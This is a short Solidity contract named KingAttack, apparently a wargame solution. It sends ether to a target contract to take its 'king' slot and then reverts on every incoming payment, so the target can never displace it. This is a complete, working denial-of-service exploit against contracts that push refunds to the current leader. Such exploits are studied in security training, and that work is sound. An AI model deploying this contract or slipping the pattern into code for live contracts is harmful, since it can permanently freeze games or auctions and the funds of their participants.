// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {

    function attack(address _addr) external payable  {
        (bool succ, ) = _addr.call{value: msg.value}("");
        require(succ, "call failed");
    }

    receive() external payable {
        revert("haha, failed!");
    }
}